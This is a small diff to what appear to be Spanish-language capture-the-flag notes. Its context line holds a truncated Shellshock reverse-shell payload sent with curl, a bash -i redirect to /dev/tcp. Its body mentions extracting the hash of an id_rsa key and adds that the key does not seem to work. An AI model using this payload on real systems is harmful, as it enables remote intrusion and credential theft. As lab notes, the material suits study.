@@ -45,4 +45,5 @@ curl -A "() { :; }; echo Content-type: text/html; echo; /bin/bash -i >& /dev/tcp
 
 ###### sacamos el hash del id_rsa
 ![[Pasted image 20240224220415.png]]
+parece que no funciona esta id_rsa
 
